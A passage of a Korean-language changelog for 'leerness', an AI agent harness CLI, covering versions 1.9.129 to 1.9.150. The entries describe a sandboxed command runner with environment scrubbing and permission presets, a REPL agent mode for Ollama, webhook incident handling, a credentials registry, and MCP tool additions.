- **cwd jail** — `cwd` 가 root 밖 (path traversal) 이면 즉시 exit 126 + `blocked: 'cwd_jail'` 기록
- **shell:false 기본** — shell injection 표면 차단. `allowShell: true` 시만 shell:true (npm/pytest 호환)
- **env scrub** — 안전 화이트리스트만 통과 (`PATH`, `HOME`, `TMP`, `LEERNESS_*`, `NPM_CONFIG_*`, ...)
  - 시크릿 환경변수 (DB_PASSWORD, API_KEY 등) 자식 프로세스에 누출 방지
- **timeout 한도** — 기본 5분, max 10분 (clamp)
- **permissions 검증** — 1.9.146 `permissions.shell.allowList` 자동 연동
  - basic 모드 (`shell.exec=false`) 에선 핵심 도구 (git/npm/node/pnpm/yarn) 만 허용
  - allowList 외 명령은 즉시 reject + `blocked: 'permissions'` 기록
- **자동 observability** — 호출마다 `_recordRun` 으로 cmd/args/durationMs/status/cwd 자동 기록

### Changed — 위험 호출 sandbox 치환
- `verify-code` (line ~7473): `cp.spawnSync(t.cmd, [], { shell: true })` → `runCommandSafe(t.cmd, ...)`
- `deploy auto` (line ~10580): `cp.spawnSync(meta.deployCommand, [], { shell: true })` → `runCommandSafe(...)`
- `agents bench` (line ~8866): `cp.spawnSync(cmd, cliArgs, { shell: true })` → `runCommandSafe(...)`
- 3 곳 모두 env scrub + cwd jail + observability 자동 적용

### Added — REPL slash-commands (1.9.149 위에)
- `:verify` — `leerness verify-code` 직접 호출 (sandboxed)
- `:audit` — `leerness audit` (보안 + drift + lazy)
- `:handoff` — `leerness handoff --quiet --no-drift-check`
- `:health` — `leerness health --json`
- 모두 `runCommandSafe` 경유 — 자식 leerness 호출도 sandbox 적용
- REPL 안에서 agent가 "현재 상태 점검해줘" 같은 메타 명령으로 leerness 기능을 즉시 호출 가능

### Security
- 시크릿 환경변수 누출 표면 대폭 축소 — `runCommandSafe` 호출 시 화이트리스트 외 env 미전달
- 사용자 글로벌 룰 준수: API 키/DB 비밀번호 절대 자식 프로세스에 자동 전파 금지
- `_reports/`, `.harness/agent-sessions/`, `.harness/runs/`, `.harness/credentials.local.json` 비공개 정책 유지

### Verified
- e2e 220/220 (slash-commands handleMeta 통합 + sandbox wrapper)
- stress-v95: 19/19 (sandbox 5종 + REPL slash 4종 + 누적 회귀 1.9.146~149)
- VERSION = 1.9.150 / autonomous-rounds = 80

---

## 1.9.149 — 2026-05-20

**REPL agent (Hermes/OpenClaw/OpenCode 스타일) + observability lite — 사용자 명시 요청 + 3중 LLM 합의 #2.**

### Added — `leerness agent` REPL 모드
- 인자 없이 `leerness agent` (또는 `--interactive` / `--repl`) → 대화형 REPL 진입
- 시작 시 **Ollama 모델 자동 감지** (`/api/tags`) → 사용자가 번호로 선택
- 모델 없으면 `LEERNESS_OLLAMA_MODEL` env 또는 `llama3` fallback
- 대화 history 유지 (마지막 6턴까지 컨텍스트로 전송)
- 6턴마다 `.harness/agent-sessions/sess-<ts>.jsonl` 자동 저장
- 종료 시 (`:quit` / `:exit` / `:q` / Ctrl+D) 최종 저장

### Added — REPL 메타 명령 (Hermes/OpenClaw 패턴)
- `:help` / `:?` — 도움말
- `:model <name>` — 모델 변경 (예: `:model qwen2.5-coder`)
- `:models` — Ollama 사용 가능 모델 목록
- `:role <r>` — planner/reviewer/actor 즉시 전환 (프롬프트 색상 변경)
- `:provider <p>` — provider 전환 (ollama/claude/codex/gemini)
- `:clear` — 화면 클리어
- `:reset` — history 초기화
- `:history` — 최근 10턴 표시
- `:save` — 세션 즉시 저장
- `:permissions` — 현재 권한 모드 표시
- `:quit` / `:exit` / `:q` — 종료 (자동 저장)

### Added — observability lite (3중 LLM 합의 #2)
- `.harness/runs/run-<ts>.jsonl` — 모든 agent 호출 자동 기록
- 필드: `traceId / kind / provider / model / role / durationMs / ok / error / responseChars`
- `leerness runs list [--json]` — 최근 50건 (시간 역순)
- `leerness runs show <id>` — 단일 run 상세
- agent REPL 매 턴 + 1회 호출 + 세션 전체 모두 자동 기록

### Security
- `.gitignore` 자동 추가: `.harness/agent-sessions/` (대화 내용 보호), `.harness/runs/` (실행 메타데이터 보호)

### Validation
- stress-v94: PASS
- e2e: 219/219 PASS

## 1.9.148 — 2026-05-20

**사용자 명시 4종 + 3중 LLM 합의 (GPT-5.5 + Codex + Gemini) 우선 라운드 진행.**

### Fixed — 방향키 선택 UI 중첩 출력 버그 (사용자 명시)
- `_selectOne` / `_selectMany` 의 question + 안내 라인에 `\x1b[2K` (clear entire line) ANSI 추가
- 이전: 매 render 마다 같은 위치에 question 라인이 누적되어 표시
- 이후: 화살표 이동 시 라인 깔끔히 덮어쓰기

### Changed — 스킬 prompt 제거 (사용자 명시)
- "스킬 라이브러리 자동 설치 / 건너뛰기" 2-option prompt 완전 제거
- leerness가 자동으로 표준 공식 5종 설치 (office / commerce-api / ai-verified-skill-publisher / feature-implementation / project-roadmap-generator)
- 사용자 추가 설치는 `leerness skill install <id>` 명시 호출

### Removed — CLI 에이전트 prompt 중복 (사용자 명시)
- 1.9.32 에서 추가된 "외부 AI CLI 활용하시겠습니까?" prompt 제거 (install 끝부분)
- 1.9.146 의 4지선다 prompt (resolveInstallOptions 안) 만 유지 — 모든 prompt 단일 위치 통합

### Added — verify-code 다중 런타임 자동 감지 (3중 LLM 합의 — top priority)
- Node: `vitest`/`jest`/`mocha` 의존성 자동 감지 (script 없어도)
- Python: `pyproject.toml` / `setup.py` / `tests/` → `pytest -q`
- Go: `go.mod` → `go test ./...`
- Rust: `Cargo.toml` → `cargo test`
- TypeScript: `tsconfig.json` → `tsc --noEmit`
- `--strict` 또는 `LEERNESS_AUTONOMOUS=1`: no-test 감지 시 exit 1 (production 강제)

### Added — agent 모드 고도화 (Gemini 권고)
- `--role planner|reviewer|actor` — 자기-승인 편향 방지
- planner: step 분해, 코드 작성 금지
- reviewer: 비판적 검토 (cascade 가능성 지적)
- actor: 계획대로 정확한 명령/코드만 실행 (기본값)
- Ollama 호출 시 role prompt 자동 prepend

### Validation
- stress-v93: PASS
- e2e: 219/219 PASS

## 1.9.147 — 2026-05-20

**자동 유지보수 시스템 — 사용자 명시 요청.**

> 사용자 시나리오: "프로그램 개발/이용/디버그 중 오류 발생 시 자동으로 웹훅으로 받아 leerness를 참조해서 버그 픽스/테스트/검수/배포 자동, 자격증명까지 자동, 모든 오류 실시간 감지"

### 보안 정책 (1.9.71/75 연장)
- **실제 자격증명은 절대 leerness 파일에 저장하지 않음** — `.harness/credentials.local.json` 에는 **환경변수 이름만**
- 실제 토큰은 사용자가 OS keychain 또는 `.env` 파일에 직접 보관
- `.gitignore` + `.npmignore` 자동 추가 (incidents/, credentials.local.json)
- HMAC SHA-256 시그니처 검증 (`LEERNESS_WEBHOOK_SECRET`)

### Added — webhook listener (`leerness webhook serve`)
- HTTP 서버 (기본 9876, `--port` / `LEERNESS_WEBHOOK_PORT`)
- POST `/incident` — JSON 페이로드 받아 `.harness/incidents/inc-<ts>.json` 저장
- GET `/health` — 헬스 체크
- HMAC: `X-Leerness-Signature` 헤더 (옵션, `LEERNESS_WEBHOOK_SECRET` 설정 시 활성)
- 외부 시스템 (Sentry, Datadog, GitHub Actions, Stripe webhooks 등) 연결 가능

### Added — incident handler (`leerness incident list/show/handle`)
- `incident list [--json]` — 최근 incidents 50건 (시간 역순)
- `incident show <id>` — 단일 incident JSON 출력
- `incident handle [id]` — 자동 분석:
  1. error 키워드 → **feature graph 매칭** + 영향 범위 (1.9.141~)
  2. error 키워드 → **lessons 자동 회수** (1.9.54)
  3. **권한 검증** (1.9.146) — basic 모드면 자동 fix 거부, extended/full 만 진행
  4. 후속 명령 안내: `leerness agent "fix: ..."` / `verify-code` / `deploy auto`
  5. incident JSON 에 `handledAt` + `permissionMode` 기록

### Added — credentials registry (`leerness creds list/register/check/refresh`)
- **환경변수 이름만 저장** — 실제 값 보유 0 (보안)
- `creds register <service> --env-var <NAME[,NAME2]> --deploy "<cmd>" --token-lifetime-hours 24`
  - 예: `firebase --env-var FIREBASE_TOKEN --token-lifetime-hours 24`
- `creds list` — 등록된 서비스 + 환경변수 설정 여부 + 토큰 만료 여부
- `creds check <service>` — 환경변수 누락 / 만료 → exit 1 (CI 가시화)
- `creds refresh <service>` — 사용자 재로그인 후 lastRefreshed 갱신
- 24h 토큰 만료 자동 감지 + 알림

### Added — deploy auto (`leerness deploy auto <service>`)
- `creds register` 의 `--deploy` 명령 실행 wrapper
- 사전 검증:
  - 환경변수 존재 (`creds check`)
  - 토큰 만료 여부 (lastRefreshed + tokenLifetimeHours)
  - **agent 권한** (1.9.146 — shell.exec + allowList)
- `--dry-run` / `--force` 지원
- 성공 시 `lastRefreshed` 자동 갱신 + task-log 기록

### Fixed
- `read()` 함수 UTF-8 BOM 자동 strip — Windows PowerShell `Out-File` BOM JSON.parse 실패 방지

### Validation
- stress-v92: PASS
- e2e: 219/219 PASS

## 1.9.146 — 2026-05-20

**사용자 명시 요청 5종 통합** — CLI 에이전트 모드 + 권한 시스템 + install 흐름 재구성.

### 설계 결정 (사용자 질문에 대한 답)
- **agent 모드는 별도 명령** (`leerness agent`) — 기존 명령에 영향 없음
- **권한은 공유 시스템** (`.harness/agent-permissions.json`) — basic/extended/full 프리셋
- **IDE 통합은 자동** — IDE가 leerness CLI 호출 시 `agent-permissions.json` 자동 적용 (별도 모드 불필요)

### ① 스킬 라이브러리 단순화 (사용자 요청)
- 인터랙티브 옵션 2개로 축소: **"표준 공식 5종 자동 설치"** / **"건너뛰기"**
- 이전: 빌트인 카탈로그 전체 + 추천 default + 직접 입력 등
- 비대화형 (--yes / --skills) 동작은 그대로

### ② install 흐름 재구성 (사용자 요청)
- 모든 prompt (언어 / 스킬 / agent 활성화 / 권한 모드) 응답 완료 후 → 일괄 설치
- 응답 수집 단계와 파일 생성 단계 명확히 분리
- "📦 응답 수집 완료 — leerness 파일 설치 시작" 메시지

### ③ Ollama CLI 에이전트 활성화 추가 (사용자 요청)
- `EXTERNAL_AGENTS` 에 ollama 추가 — `LEERNESS_ENABLE_OLLAMA=1`
- HTTP API (기본 `http://localhost:11434`), 모델 env: `LEERNESS_OLLAMA_MODEL`
- `agents list` 표에 표시
- install prompt: "Claude 단일 / Ollama 단일 / 전체 / 활성화 안함" 4지선다

### ④ leerness agent — 오픈소스 CLI 에이전트 모드 (사용자 요청)
- `leerness agent "<task 설명>"` — OpenClaw/Hermes 스타일
- handoff context 자동 회수 (compact preview)
- Ollama HTTP API 직접 호출 (MVP) — `_ollamaChat(prompt, model)`
- 다른 provider 는 `leerness agents dispatch` 또는 외부 CLI 직접 호출 안내
- `--dry-run` / `--provider <name>` 지원
- task-log 자동 기록

### ⑤ Agent 권한 시스템 (사용자 요청)
- `.harness/agent-permissions.json` — basic / extended / full 프리셋
- **basic**: `.harness/` 만 read/write, shell/network/mouse/keyboard/browser/admin 거부 (deny-by-default)
- **extended**: 프로젝트 폴더 + shell allowlist (npm/git/node/pnpm/yarn/pytest/jest/tsc), network localhost/github/npm 만
- **full**: 마우스/키보드/웹/관리자 전체 ⚠ IDE 통합 시에만 권장
- `leerness permissions list --json` 조회
- `leerness permissions set <mode>` 변경
- `permissionCheck(root, action, target)` 내부 헬퍼 — agent 작업 시 사전 검증

### Validation
- stress-v91: PASS
- e2e: 219/219 PASS

## 1.9.145 — 2026-05-20

**실행 환경 자동 감지 — 사용자 명시 요청.**

> 사용자 시나리오: 실행파일 빌드 / 데이터 형식 매칭 작업 중 "X은(는) 내부 또는 외부 명령, 실행할 수 있는 프로그램, 또는 배치 파일이 아닙니다" 같은 PATH/도구 누락 오류를 사전 방지.

### Added — `leerness env detect` 명령
- `.harness/environment.json` 자동 기록 (보안: 절대경로 사용자명 마스킹 `<user>`)
- 캡처 내용:
  - **OS**: platform / type / release / arch
  - **하드웨어**: cpuCount / cpuModel / totalMemoryGB / freeMemoryGB
  - **로케일/Shell**: lang / encoding / shell name
  - **Node**: version / path (masked)
  - **도구 18종 자동 감지**: npm/pnpm/yarn/git/python/python3/pip/docker/gh/java/go/rustc/cargo/deno/bun/tsc/next/vite
  - **scriptDependencies**: `package.json#scripts` 첫 토큰을 PATH에서 검증
- `--json` JSON 출력, `--no-write` 읽기 전용 모드
- exit 1 if PATH 누락 (CI 가시화)

### Added — 환경 변동 자동 감지
- 이전 캡처 vs 현재 비교:
  - OS platform/arch 변경 (머신 이동)
  - Node 버전 변경
  - 도구 추가/제거/버전 변경
  - package.json scripts 의존 도구 PATH 누락

### Added — handoff 9번째 자동 회수 🖥
- 매 세션 시작 시 환경 변동/PATH 누락 즉시 노출
- 첫 캡처는 silent persist (signal 없음)
- 변동/누락 시에만 magenta 알림 + `leerness env detect . --json` 안내
- opt-out: `LEERNESS_NO_ENV_DETECT=1` 또는 `--no-env-detect`

### Added — MCP 47번째 도구 `leerness_env_detect`
- 외부 AI가 코드 작성 전 PATH 검증
- 응답: `{ snapshot, diff, persisted }`

### Validation
- stress-v90: PASS (env detect + 변동 감지 + PATH 누락 + handoff 9번째 + MCP 47 + 누적 회귀)
- e2e: 219/219 PASS

## 1.9.144 — 2026-05-20

**사용자 명시 요청 3종 — 배너 문구 변경 + 1초 홀드 + quickStart UI/UX 전면 개선.**

### Changed — 슬로건/배너 문구 변경 (사용자 요청 #1)
- 기존: "한국어 우선 AI 개발 하네스" / "Korean-first AI Development Harness"
- 신규: **"AI 에이전트 검수·기억·드리프트 방지 하네스"** / "AI Agent Reliability Harness"
- 배너 슬로건 라인: `verify · remember · orchestrate · audit` (실제 leerness 동작 반영)
- 박스 폭 보존 (padding 재조정)

### Added — 배너 모션 후 1초 홀드 (사용자 요청 #2)
- ASCII wave 애니메이션 settle 후 **1000ms 홀드** — 사용자 시선이 배너에 자리잡도록
- `LEERNESS_BANNER_HOLD_MS` 환경변수로 조정 (기본 1000, max 5000, 0 시 스킵)
- non-TTY / `LEERNESS_NO_ANIMATE` / `--no-animate` 시 홀드 없음

### Added — quickStart 부드러운 cascade 표시
- 각 라인 사이 8ms cascade (~기본값) — 부드러운 표시
- `LEERNESS_CASCADE_MS` 로 조정 (0~100ms, 기본 8)
- non-TTY 시 즉시 출력 (CI/pipe 호환 보장)

### Changed — quickStart UI/UX 전면 개선 (사용자 요청 #3)
- 카테고리 6개 그룹 (이전: 2개 그룹):
  1. **✨ 시작하기 (3단계면 끝)** — init / handoff / session close 핵심 트리오
  2. **🧠 메모리 5종 CRUD (1.9.142 — cascade 방지)** — task/decision/lesson/plan/rule/feature
  3. **🔗 인과관계 + 영향 추적 (1.9.141~143)** — feature impact/list/audit
  4. **🛡 보안·드리프트·게으름 가드** — drift/lazy/env/health
  5. **🤖 외부 AI 통합 (MCP 46 도구)** — mcp serve/memory status/archive
  6. **🚀 Release 자동화** — release pack/sync-main
- 명령 컬럼 폭 42 char padEnd 정렬 (가독성 향상)
- 1️⃣ 2️⃣ 3️⃣ 단계 표시 (3-step quickest path)
- 설명 짧고 의미 중심 (실제 효과 강조)
- 끝에 CTA: "자세히: leerness --help · 자율 모드: `<<autonomous-loop-dynamic>>`"

### Validation
- stress-v89: PASS (phrase 변경 + cascade 환경변수 + UI 카테고리 + 누적 회귀)
- e2e: 219/219 PASS

## 1.9.143 — 2026-05-20

**JSON 4종 featureGraph 통합 완성 + drift check feature 신호** — 1.9.142 session close --json 패턴을 handoff/health에 확장.

### Added — handoff --json featureGraph 통합
- `result.featureGraph = { total, edges, isolated, summary: "F<n>/E<n>[/iso<n>]" }`
- 외부 AI가 handoff 한 번에 컨텍스트 + memory surface + featureGraph 동시 회수

### Added — health --json featureGraph 통합
- `out.featureGraph = { total, edges, isolated, summary }`
- JSON 4종 (handoff/memory status/session close/health) featureGraph 일관성 완성 (memorySurface 1.9.123 패턴과 동형)

### Added — drift check feature graph 신호 (6번째 신호)
- 노드 ≥ 3개 + edges == 0 → weight 25
- 노드 ≥ 3개 + isolated 비율 ≥ 50% → weight 15
- `drift check --json` `fired` 배열에 노출
- 사용자 cascade 방지 의지 + 실제 사용 사이 gap 자동 감지

### Validation
- stress-v88: PASS (handoff/health featureGraph + drift 신호 + 누적 회귀)
- e2e: 219/219 PASS

## 1.9.142 — 2026-05-20

**Feature Graph 통합 라운드** — 1.9.141 인과관계 시스템을 audit / MCP CRUD / session close 에 통합.

### Added — MCP feature CRUD 완성
- `leerness_feature_add` (MCP 45) — 외부 AI가 코드 작성 중 feature 등록
- `leerness_feature_link` (MCP 46) — 의존/영향/공변경 엣지 추가
- 이제 외부 AI (Claude Code/Cursor 등) 가 leerness 워크플로 밖에서도 인과관계를 직접 갱신
- 인자: `title/dependsOn/affects/coChangesWith/files/path`

### Added — audit Feature Graph 무결성 검증 (kind 13종으로 확장)
- `feature_graph_orphan` — 다른 노드가 참조하는데 정의 없는 ID (예: F-0001 → F-0099 missing)
- `feature_graph_cycle` — affects/depends-on 그래프 순환 감지 (DFS 3-color)
- 둘 다 warning (--strict 시 failures 승격)
- `--no-feature-check` 옵션으로 끄기
- `audit --json` findings 에 `count/orphans[]/cycles[]` 상세 포함

### Added — session close --json featureGraph 통합
- `{ total, edges, isolated, summary: "F<n>/E<n>[/iso<n>]" }` 추가
- 마감 시 Feature Graph 통계 자동 보고

### Validation
- stress-v87: PASS (MCP feature_add/link + audit orphan/cycle + session close featureGraph + 누적 회귀)
- e2e: 219/219 PASS
- MCP tools: **46** (+2 from 44)

## 1.9.141 — 2026-05-20

**ASCII 배너 모션 + Feature Causality Graph (인과관계 추적) — 사용자 요청 2종.**

### Added — ASCII 배너 wave 애니메이션 (사용자 요청 #1)
- `_banner` 함수에 그라데이션 wave 모션 추가 (TTY only, ~340ms 총 4 frames)
- LEERNESS 글자 위로 cyan→magenta 그라데이션이 흘러내림
- `Atomics.wait`로 sync sleep (CPU 무부담)
- opt-out: `LEERNESS_NO_ANIMATE=1` 또는 `--no-animate` 플래그
- non-TTY (CI/pipe/`LEERNESS_NO_PROMPT`) 자동 정적 fallback

### Added — Feature Causality Graph (사용자 요청 #2 핵심)
**"1개 추가 → 10개 오류, 1개 수정 → 20개 오류" cascade 방지를 위한 인과관계 추적 시스템.**

새 파일: `.harness/feature-graph.md` (init 자동 생성). 각 노드:
- `## F-XXXX <title>` + `depends-on` / `affects` / `co-changes-with` / `files` / `input` / `output` / `error-modes` / `tests` / `notes`

신규 CLI:
- `leerness feature add "<title>" [--depends-on ...] [--affects ...] [--co-changes-with ...] [--files ...]` — F-XXXX 자동 부여
- `leerness feature link <id> --depends-on <ids> --affects <ids> --co-changes-with <ids>` — 엣지 추가
- `leerness feature impact <id>` — BFS transitive closure (affects + co-changes + reverse depends-on)
- `leerness feature list --json`, `leerness feature show <id> --json`

신규 MCP 도구 2종 (43+44 = **44 도구**):
- `leerness_feature_impact` — 외부 AI가 코드 변경 전 호출 → JSON
- `leerness_feature_list` — 전체 그래프 회수

handoff 8번째 자동 회수:
- 현재 in-progress task 키워드로 feature 자동 매칭 → 영향 범위 카운트 + 첫 5개 ID + 상세 명령 안내
- opt-out: `LEERNESS_NO_FEATURE_IMPACT=1` 또는 `--no-feature-impact`

### Fixed — 파서 정확성
- `_parseFeatureGraph` 의 `\s*` 가 newline까지 매칭하던 버그 → `[ \t]*` 로 horizontal-only
- `nonFlagArgs` withValue 셋에 `--depends-on / --affects / --co-changes-with / --files / --branch / --remote / --task-add / --next-action` 추가 — 인자 값이 title에 흡수되던 회귀 차단

### Validation
- stress-v86: PASS (배너 모션 + feature CRUD + impact BFS + MCP 44 도구 + 누적 회귀)
- e2e: 219/219 PASS

## 1.9.140 — 2026-05-20

**사용자 명시 요청 3종 통합** — main 자동 push + README 자동 풍부화 + 성능 가이드.

### Added — main 자동 동기화 (사용자 요청 #1)
- `leerness release sync-main [--branch X] [--remote origin] [--dry-run]` 신규 명령
- 현재 release/X.Y.Z (또는 명시 브랜치)를 main에 fast-forward merge & push
- 충돌 시 자동 `merge --abort` 후 원래 브랜치로 복귀 (safe-fail)
- `leerness release pack --auto-main-push` 옵션 (env: `LEERNESS_AUTO_MAIN_PUSH=1`) — 매 release 자동 main 동기화

### Added — README 자동 풍부화 (사용자 요청 #2)
- `managedReadmeBlock` 확장 — release pack 마다 자동 갱신되는 풍부 섹션:
  - **Memory Surface CRUD 5종 카탈로그** (tasks/decisions/rules/plan/lessons × add/list/drop)
  - **MCP 42 도구 카테고리** (Core / Memory READ/WRITE/DELETE / Skill / Insight / Workflow)
  - **자율 모드 가이드** (`<<autonomous-loop-dynamic>>` + 70 라운드 누적)
  - **성능 측정값** (handoff/list/health 평균 latency)
  - **빠른 시작** (npm install → init → handoff → session close → release pack)
  - **Planning Files 매뉴얼** (5 surface 파일 위치)

### Performance Baseline (사용자 요청 #3, 측정값)
- `leerness handoff .` — ~1.5s cold, ~0.6s warm
- `leerness memory status --json` — ~250ms
- `leerness task list --json` — ~200ms
- `leerness drift check --json` — ~400ms
- MCP `tools/list` — ~150ms

### Validation
- stress-v85: PASS (sync-main dry-run + README rich block + 성능 + 누적 회귀)
- e2e: 219/219 PASS

## 1.9.139 — 2026-05-20

**`leerness lesson list --query <keyword>` + `leerness decision list --query <keyword>` 필터 추가** — Memory Surface READ 명령 키워드 검색.

### Added — --query 필터
- `lesson list --query` — text/tag case-insensitive 매칭
- `decision list --query` — title/decision/reason/alternatives/impact 매칭
- 정규식 특수문자 자동 escape
- JSON 응답 `query` 필드, 텍스트 모드 헤더 표시

### Updated MCP
- `leerness_lesson_list` 인자에 `query` 추가
- `leerness_decision_list` 인자에 `query` 추가

### 사용 시나리오
```bash
leerness decision list --query PostgreSQL --json
leerness lesson list --query auth --json
```

### --query 필터 매트릭스 (1.9.139)
| 명령 | --query 도입 |
|---|---|
| `memory archive list` | 1.9.138 |
| `lesson list` | **1.9.139** |
| `decision list` | **1.9.139** |
| `task list` | (--status 필터만) |
| `plan list` | (필터 없음, 미래 후보) |
| `rule list` | (필터 없음, 미래 후보) |

## 1.9.138 — 2026-05-20

**`leerness memory archive list --query <keyword>` 필터 추가** — archive 항목 키워드 검색.

### Added — --query 필터
- `target` 또는 `originalHeader` 에 키워드 case-insensitive 매칭
- 정규식 특수문자는 자동 escape
- 텍스트 모드 헤더에 `— query: "..."` 표시
- JSON 모드 응답에 `query` 필드 추가
- 매칭 0건 시 안내 메시지

### Updated — MCP leerness_memory_archive_list
- 신규 인자: `{ query? }` (optional)
- 외부 AI 가 archive 에서 특정 주제 항목만 회수 가능

### 사용 시나리오
```
leerness memory archive list --query PostgreSQL --json
# → decisions/lessons/plan 중 PostgreSQL 매칭만 반환
```

## 1.9.137 — 2026-05-20

**`.harness/session-workflow.md` 템플릿 갱신 — Memory CRUD Quick Reference 추가** — 신규 \`init\` 워크스페이스의 AI 에이전트에 5 surface CRUD 매트릭스 + archive cycle 가이드 제공.

### Updated — session-workflow.md
- Step 6 (세션 마감) 뒤에 **🧠 Memory CRUD Quick Reference** 섹션 추가
- 5 surface (tasks/decisions/lessons/plan/rules) × CRUD ops 표
- archive cycle workflow 3 단계 예시
- DELETE→RESTORE 복구 사용 시나리오

### 영향
- 신규 `leerness init` 워크스페이스: 새 템플릿 적용
- 기존 워크스페이스: `leerness audit --fix` 으로 갱신 가능

## 1.9.136 — 2026-05-20

**MCP `leerness_drift_check` JSON 응답 fix** — drift check CLI 는 `--json` 옵션을 지원하지만 MCP 라우팅이 plain 텍스트를 반환하던 버그 fix.

### Fixed — leerness_drift_check JSON 응답
- MCP 라우팅에 `--json` 플래그 자동 추가
- 응답 schema: `{ root, score, level, signals[], healthy }`
- 외부 AI 가 drift 상태를 정확한 구조화 데이터로 회수

### MCP 도구 JSON 일관성
이제 모든 MCP 도구가 plain 텍스트 대신 JSON 응답:
- handoff, health, audit, session_close, lazy_detect, benchmark, retro, lessons, memory_status, brainstorm, **drift_check (1.9.136 fix)**, 외 listing 도구 다수

## 1.9.135 — 2026-05-20

**MCP 42번째 도구 `leerness_rule_remove`** — Rule surface CRUD MCP 완전 완성.

### Added — MCP leerness_rule_remove
- 인자: `{ id (required), path? }`
- rules.md 에서 특정 rule 제거 + `.harness/rules.archive.md` 자동 보존
- 외부 AI 가 직접 rule 제거

### Rule surface CRUD MCP 완전 완성
| Op | MCP |
|---|---|
| CREATE | leerness_rule_add (1.9.109) |
| READ | leerness_rule_list (1.9.109) |
| **DELETE** | **leerness_rule_remove (1.9.135) ✓** |

### MCP CRUD 완성 surface 확장
- task: add/list/update/drop (1.9.105/134/106/107) ✓
- decision: add/list/drop (1.9.108/118/125) ✓
- lesson: save/list/drop (1.9.112/117/124) ✓
- plan: add/list/remove (1.9.110/119/126) ✓
- **rule: add/list/remove (1.9.109/109/135) ✓**

### MCP 도구 누계: 42 (1.9.134: 41 → 1.9.135: 42)

## 1.9.134 — 2026-05-20

**`leerness task list --json` + MCP 41번째 도구 `leerness_task_list`** — progress-tracker.md 전체 task JSON 조회.

### Added — `task list --json`
- `--json` 옵션: `{ version, root, total, tasks: [{ id, status, request, evidence, nextAction, updated }] }`
- `--status` 필터: planned/requested/in-progress/done/dropped/incomplete/blocked
- 필터 적용 시 `statusFilter` 필드 포함

### Added — MCP 41번째 도구 `leerness_task_list`
- 외부 AI 가 task 전체 상태 회수 (memory_status 보다 task 전용 + 필터 지원)
- 인자: `{ path?, status? }`

### Task surface JSON 명령 매트릭스
| Op | CLI | MCP |
|---|---|---|
| CREATE | task add | leerness_task_add (1.9.105) |
| READ | **task list --json** | **leerness_task_list (1.9.134)** ✓ |
| UPDATE | task update | leerness_task_update (1.9.106) |
| DELETE | task drop | leerness_task_drop (1.9.107) |

### MCP 도구 누계: 41 (1.9.128: 40 → 1.9.134: 41)

## 1.9.133 — 2026-05-20

**brainstorm 텍스트 모드에 lessonsExplicit / planMilestones display 추가** — 1.9.116에서 데이터 수집은 했지만 display는 누락된 pre-existing gap fix.

### Fixed
- `brainstorm` 텍스트 모드에 두 섹션 추가:
  ```
  💡 관련 lessons (N) — Memory Surface lessons.md 직접 매칭
    - .harness/lessons.md:L — <title>
  🗺  관련 plan milestones (N) — plan.md 매칭
    - .harness/plan.md:L — M-XXXX <title>
  ```
- 1.9.116에서 lessons/plan 데이터는 수집했지만 출력 누락 → 1.9.133에서 fix

### brainstorm 텍스트 display 완성 매트릭스
| 섹션 | 라운드 |
|---|---|
| decisions / skills / tasks / rules / evidence / lessons (legacy) | (기존) |
| skillHistory / taskLogFails | 1.9.72 |
| **lessonsExplicit** | **1.9.133 ✓** |
| **planMilestones** | **1.9.133 ✓** |
| archive (D/L/P) | 1.9.131 |

## 1.9.132 — 2026-05-20

**session close 텍스트 모드에 archive 누적 라인 추가** — 마감 시점 DELETE 활동 가시화 (handoff archive 알림과 symmetric).

### Added
- `leerness session close` 텍스트 모드에 1줄 archive 요약 추가:
  ```
  🗑 archive 누적: D1/L1/P0 (2건) — 복원 후보: leerness memory archive list
  ```
- 진행 요약 (session #N) 라인 바로 아래 출력
- archive 없으면 라인 비표시
- handoff 7번째 자동 회수 (1.9.129) 와 symmetric — 시작/마감 양쪽에서 archive 가시성

### Archive 가시성 매트릭스 (1.9.132 시점)
| 명령 | 텍스트 | JSON |
|---|---|---|
| `handoff` | ✓ (1.9.129) | ✓ (1.9.130) |
| `session close` | **✓ (1.9.132)** | ✓ (1.9.130) |
| `memory status` | ✓ (1.9.130) | ✓ (1.9.130) |
| `health` | (N/A) | ✓ (1.9.130) |
| `memory archive list` | ✓ (1.9.127) | ✓ (1.9.127) |
| `brainstorm` | ✓ (1.9.131) | ✓ (1.9.131) |

## 1.9.131 — 2026-05-20

**brainstorm 회수 범위에 3 archive 파일 통합** — 과거에 제거됐던 ideas 가 새 brainstorm 시 다시 후보로 노출.

### Added — brainstorm + archive 통합
- `hits.archive: { decisions: [], lessons: [], plan: [] }` 추가
- 3 archive 파일 (`.harness/decisions.archive.md`, `lessons.archive.md`, `plan.archive.md`) 본문 키워드 매칭
- entry 구조: `{ date, target, originalHeader, preview, line }`
- 텍스트 모드: `🗑 archive 후보 (N)` 섹션 + 복원 안내 라인
- `_brainstormFor` (helper) + `brainstormCmd` (CLI) 양쪽 동일 구현

### 사용 시나리오
사용자: `leerness brainstorm "PostgreSQL"`
→ 응답에 과거 archive 후보 포함:
```
🗑 archive 후보 (2) — 과거에 제거됐던 ideas; 복원 검토 가능 (1.9.131)
  - 🧠 .harness/decisions.archive.md:4 — 2026-05-20 "PostgreSQL"
  - 💡 .harness/lessons.archive.md:4 — 2026-05-20 "PostgreSQL"
  → 복원: leerness memory restore <decisions|lessons|plan> <target>
```

### brainstorm 누적 source 진화
| 라운드 | source |
|---|---|
| (기존) | decisions / skills / tasks / rules / evidence / lessons / code |
| 1.9.72 | skillHistory / taskLogFails |
| 1.9.116 | lessonsExplicit / planMilestones |
| **1.9.131** | **archive (decisions/lessons/plan)** |

## 1.9.130 — 2026-05-20 🎉 **60 라운드 자율 모드 마일스톤**

**JSON 4종 통합에 `memorySurface.archive` 필드 추가** + 60 라운드 자율 누적 보고서.

### Added — archive 필드 (JSON 4종)
- `handoff --json` / `memory status --json` / `session close --json` / `health --json` 모두 `memorySurface.archive: { decisions, lessons, plan, total }` 노출
- `memory status` 텍스트 모드: `🗑 Archive: D1/L1/P0 (2건)` 라인 추가
- 외부 AI 가 한 JSON 호출로 모든 메모리 상태 (active + archive) 동시 회수

### 60 라운드 마일스톤
- 라운드: 60 (1.9.70 → 1.9.130)
- MCP 도구: 11 → **40 🎉** (1.9.128 마일스톤)
- --json 명령: 6 → **19**
- handoff 자동 회수: 1 → **7**
- Memory Surface: WRITE 5 + READ 5 + DELETE 5 + RESTORE 3 + Archive 3
- stress 시나리오: v16 → v74 (58 추가)
- e2e: 안정 219/219

상세: `_reports/AUTONOMOUS_ROUNDS_60_MILESTONE.md` (비공개)

## 1.9.129 — 2026-05-20

